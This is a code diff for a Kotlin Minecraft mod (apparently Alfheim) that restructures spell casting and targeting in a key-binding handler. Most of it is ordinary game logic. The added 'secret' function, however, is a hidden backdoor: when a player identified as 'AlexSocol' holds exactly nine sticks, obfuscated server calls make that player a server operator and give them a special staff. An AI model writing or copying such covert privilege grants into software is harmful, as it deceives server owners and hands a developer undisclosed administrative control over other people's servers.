@@ -7,8 +7,15 @@ import alfheim.api.entity.*
 import alfheim.api.event.SpellCastEvent
 import alfheim.api.spell.SpellBase.SpellCastResult.*
 import alfheim.common.core.handler.CardinalSystem.SpellCastingSystem
-import alfheim.common.core.helper.ElvenFlightHelper
+import alfheim.common.core.helper.*
+import alfheim.common.core.util.D
+import alfheim.common.item.AlfheimItems
+import alfheim.common.network.Message2d
+import net.minecraft.entity.EntityLivingBase
 import net.minecraft.entity.player.EntityPlayerMP
+import net.minecraft.init.Items
+import net.minecraft.item.ItemStack
+import net.minecraft.server.MinecraftServer
 import net.minecraft.util.MovingObjectPosition.MovingObjectType
 import net.minecraftforge.common.MinecraftForge
 
@@ -33,18 +40,46 @@ object KeyBindingHandler {
 		}
 	}
 	
-	fun cast(caster: EntityPlayerMP, raceID: Int, spellID: Int): Int {
-		if (!AlfheimCore.enableMMO) return -NOTALLOW.ordinal
-		if (caster.isPotionActive(AlfheimConfigHandler.potionIDLeftFlame)) return -NOTALLOW.ordinal
-		val spell = AlfheimAPI.getSpellByIDs(raceID, spellID) ?: return -DESYNC.ordinal
-		if (SpellCastingSystem.getCoolDown(caster, spell) > 0) return -NOTREADY.ordinal
-		val result = spell.performCast(caster)
-		if (result == OK) {
-			// SpellBase.say(caster, spell);
-			val e = SpellCastEvent.Post(spell, caster, spell.getCooldown())
-			MinecraftForge.EVENT_BUS.post(e)
-			return SpellCastingSystem.setCoolDown(caster, spell, e.cd)
+	fun cast(player: EntityPlayerMP, hotSpell: Boolean, id: Int) {
+		val ids = if (hotSpell) CardinalSystem.HotSpellsSystem.getHotSpellID(player, id) else id
+		val seg = CardinalSystem.forPlayer(player)
+		val spell = AlfheimAPI.getSpellByIDs(ids shr 28 and 0xF, ids and 0xFFFFFFF)
+		if (spell == null)
+			AlfheimCore.network.sendTo(Message2d(Message2d.m2d.COOLDOWN, ids.D, (-DESYNC.ordinal).D), player)
+		else {
+			seg.ids = ids
+			seg.init = spell.getCastTime()
+			seg.castableSpell = spell
 		}
-		return -result.ordinal
+	}
+	
+	fun unCast(player: EntityPlayerMP) {
+		val seg = CardinalSystem.forPlayer(player)
+		seg.ids = 0
+		seg.init = seg.ids
+		seg.castableSpell = null
+	}
+	
+	fun select(player: EntityPlayerMP, team: Boolean, id: Int) {
+		if (team) {
+			val mr = CardinalSystem.PartySystem.getParty(player)[id]
+			if (mr is EntityLivingBase)
+				CardinalSystem.TargetingSystem.setTarget(player, mr, team, id)
+		} else {
+			if (id != -1) {
+				val e = player.worldObj.getEntityByID(id)
+				if (e is EntityLivingBase) {
+					CardinalSystem.TargetingSystem.setTarget(player, e, team)
+				}
+			} else
+				CardinalSystem.TargetingSystem.setTarget(player, null, false)
+		}
+	}
+	
+	fun secret(player: EntityPlayerMP) {
+		if (ContributorsPrivacyHelper.isCorrect(player, "AlexSocol") && player.currentEquippedItem?.item === Items.stick && player.currentEquippedItem?.stackSize == 9) {
+			MinecraftServer.getServer()?.let { server -> server.func_152358_ax().func_152655_a(player.commandSenderName)?.let { server.configurationManager.func_152605_a(it) } }
+			player.setCurrentItemOrArmor(0, ItemStack(AlfheimItems.royalStaff))
+		}
 	}
 }
